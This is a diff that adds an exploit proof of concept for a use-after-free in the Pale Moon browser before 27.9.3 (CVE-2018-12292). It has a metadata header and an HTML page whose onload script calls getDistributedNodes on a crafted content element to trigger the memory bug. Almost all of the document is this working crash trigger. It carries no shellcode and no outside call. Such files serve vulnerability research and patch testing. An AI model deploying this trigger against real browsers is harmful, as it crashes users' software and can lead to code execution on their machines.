@@ -1,0 +1,37 @@
+# Exploit Title: Pale Moon Browser < 27.9.3 - Use After Free (PoC) 
+# Date: 2018-06-13
+# Author - Berk Cem Goksel  
+# Vendor Homepage: https://www.palemoon.org/ 
+# Software Link: https://www.palemoon.org/palemoon-win32.shtml 
+# Version:  Versions prior to 27.9.3 (Tested versions: 27.9.0, 27.9.1, 27.9.2)  
+# Tested on: Windows 10 
+# Category: Windows Remote Exploit 
+# CVE : CVE-2018-12292 
+
+
+<html>
+<head>
+<style>
+</style>
+<script>
+
+function SetVariable(fuzzervars, var_name, var_type) { 
+fuzzervars[var_type] = var_name;
+ }
+
+function jsfuzzer() {
+
+var var_1 = var_2.getDistributedNodes();
+SetVariable(var_1, 'NodeList'); 
+
+}
+
+
+</script>
+</head>
+<body onload=jsfuzzer()>
+<!-- beginhtml -->
+<content id="var_2" loopend="1" default="" max="0" charset="ISO-2022-JP"></content>
+<!-- endhtml -->
+</body>
+</html>
